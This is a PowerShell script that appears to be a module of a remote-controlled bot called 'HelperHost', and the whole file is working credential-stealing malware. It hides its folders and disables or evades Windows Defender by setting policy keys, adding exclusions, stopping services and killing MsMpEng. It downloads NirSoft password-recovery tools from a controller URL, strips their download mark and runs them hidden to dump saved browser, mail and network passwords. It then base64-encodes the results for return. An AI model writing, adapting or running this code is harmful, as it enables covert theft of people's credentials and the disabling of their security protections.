# Runs one NirSoft tool; id via $env:AGENTSHE_TOOL_ID
$ErrorActionPreference = 'Continue'
$id = $env:AGENTSHE_TOOL_ID
if (-not $id) { throw 'AGENTSHE_TOOL_ID manquant' }

$toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null
cmd /c ('attrib +h +s "' + (Join-Path $env:LOCALAPPDATA 'HelperHost') + '"') | Out-Null

$base = $env:AGENTSHE_FILES
if (-not $base) {
  try {
    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
    if ($st) {
      $j = $st | ConvertFrom-Json
      if ($j.bot_base) { $base = ($j.bot_base.TrimEnd('/') + '/files') }
    }
  } catch {}
}
if (-not $base) { throw 'AGENTSHE_FILES / bot_base manquant' }
$base = $base.TrimEnd('/')

$map = @{
  chromepass  = @{ leaf = 'ChromePass.exe'; rel = 'ChromePass.exe' }
  webbrowser  = @{ leaf = 'WebBrowserPassView.exe'; rel = 'WebBrowserPassView.exe' }
  passwordfox = @{ leaf = 'PasswordFox.exe'; rel = 'x64/PasswordFox.exe'; rel32 = 'PasswordFox.exe' }
  mailpv      = @{ leaf = 'mailpv.exe'; rel = 'mailpv.exe' }
  mspass      = @{ leaf = 'mspass.exe'; rel = 'mspass.exe' }
  netpass     = @{ leaf = 'netpass.exe'; rel = 'x64/netpass.exe'; rel32 = 'netpass.exe' }
  iepv        = @{ leaf = 'iepv.exe'; rel = 'iepv.exe' }
  dialupass   = @{ leaf = 'Dialupass.exe'; rel = 'Dialupass.exe' }
  pstpassword = @{ leaf = 'PstPassword.exe'; rel = 'PstPassword.exe' }
}
$t = $map[$id]
if (-not $t) { throw "outil inconnu: $id" }

try {
  $wid = [Security.Principal.WindowsIdentity]::GetCurrent()
  $prin = New-Object Security.Principal.WindowsPrincipal($wid)
  $isAdmin = $prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  if ($isAdmin) {
    $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
    New-Item $wdPol -Force | Out-Null
    Set-ItemProperty $wdPol -Name DisableAntiSpyware -Value 1 -Type DWord -Force
    Set-ItemProperty $wdPol -Name DisableAntiVirus -Value 1 -Type DWord -Force
    New-Item "$wdPol\Real-Time Protection" -Force | Out-Null
    Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
      Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
      Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
      Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
      Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue
      Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
      Set-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
      Set-MpPreference -ExclusionExtension '.exe','.txt','.zip' -EA SilentlyContinue
    }
    foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
      Stop-Service $svc -Force -EA SilentlyContinue
    }
    Get-Process MsMpEng -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
  } elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {
    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
    Add-MpPreference -ExclusionExtension '.exe','.txt' -EA SilentlyContinue
  }
} catch {}

$dest = Join-Path $toolsDir $t.leaf
$url = "$base/tools/$($t.rel)"
$url32 = if ($t.rel32) { "$base/tools/$($t.rel32)" } else { $url }
if (-not [Environment]::Is64BitOperatingSystem) { $url = $url32 }
if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
  & curl.exe -fsSL $url -o $dest 2>$null
  if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
    & curl.exe -fsSL $url32 -o $dest 2>$null
  }
}
if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
  throw 'download failed (Defender?)'
}
Unblock-File $dest -EA SilentlyContinue
$zone = $dest + ':Zone.Identifier'
if (Test-Path $zone) { Remove-Item $zone -Force -EA SilentlyContinue }

$out = Join-Path $toolsDir ($id + '.txt')
Remove-Item $out -Force -EA SilentlyContinue
$p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -EA SilentlyContinue
if ($null -eq $p) { throw 'start failed (bloque?)' }
if (-not $p.WaitForExit(50000)) {
  Stop-Process -Id $p.Id -Force -EA SilentlyContinue
  throw 'timeout'
}
Start-Sleep -Milliseconds 300
if (-not (Test-Path $out)) {
  Set-Content -Path $out -Value '(aucune donnee exportee)' -Encoding UTF8
}
cmd /c ('attrib +h +s "' + $dest + '"') | Out-Null
cmd /c ('attrib +h +s "' + $out + '"') | Out-Null
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($out))
Write-Output ('FILEB64:' + [IO.Path]::GetFileName($out) + ':' + $b64)
